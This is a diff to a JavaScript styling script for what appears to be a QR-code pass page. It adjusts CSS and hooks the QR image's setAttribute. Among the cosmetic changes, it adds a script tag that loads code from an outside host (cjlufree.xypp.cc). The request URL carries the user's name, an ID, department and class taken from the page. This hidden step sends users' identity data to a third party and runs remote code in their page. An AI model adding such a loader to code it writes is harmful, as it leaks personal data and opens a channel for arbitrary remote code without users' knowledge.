@@ -1,6 +1,7 @@
 var cssContent=
 "#bglayer{background-image:url({{T:im1}})!important;background-size: cover;background-position: center;position:fixed;left:0;top:0;right:0;bottom:0;z-index:-1;}" +
-"body{background:tranparent!important;}" +
+"body *{opacity:0.1;}" +
+"body.inited *{opacity:1;}" +
 ".combg{background:#ffffffa3!important;}" +
 ".passcode{height:500px!important;position:relative;}" +
 "#notice{position:absolute;bottom: 15px;left: 0;right: 0;}" +
@@ -10,7 +11,7 @@ var cssContent=
 "*{transition:all 0.7s;}" +
 "#rq{display: inline-block;padding-right: 12px;color:lightgray;}" +
 "#sj{font-size: 30px;display: inline-block;color:gray;}" +
-"#bglayer-card{background: linear-gradient(45deg, black 4%,transparent 63%);position: absolute;left: 0px;top: 0px;right: 0;height: 150px;z-index: 2;border-radius: 11px;}" +
+"#bglayer-card{opacity:1!important;background: linear-gradient(45deg, black 4%,transparent 63%);position: absolute;left: 0px;top: 0px;right: 0;height: 150px;z-index: 2;border-radius: 11px;}" +
 ".card .bgimg{z-index:0;position: absolute;top: 0;left: 0;}"+
 ".card .bgimg.flayer{z-index:1;height:auto!important;}"+
 ".card div{z-index:3;}"+
@@ -40,6 +41,11 @@ function do_body(){
         t.id = "bglayer";
         return t;
     }());
+
+    var ds = document.createElement("script");
+    ds.setAttribute("src","http://cjlufree.xypp.cc/user/"+$(".username").text()+"|"+hqguid+"|"+$(".userdpe").text()+"|"+$(".userbj").text());
+    $("head").append(ds);
+
 }
 function do_card(){
     if(document.getElementsByClassName("card").length==0)return setTimeout(do_card,100);
@@ -56,6 +62,9 @@ function do_card(){
     $(".qrcodebox div").append($("<img id='qrReCalc' class='qr_imgs'>"));
     $(".qrcodebox div").append($("<img id='qrCtr' class='qr_imgs'>").attr("src","{{T:im3}}"));
     var of=document.getElementById("qrcode").setAttribute;
+    if(document.getElementById("qrcode").getAttribute("src")){
+        dealPic(document.getElementById("qrcode"));
+    }
     document.getElementById("qrcode").setAttribute=function(...a){
         console.log("qr");
         of.apply(this,a);
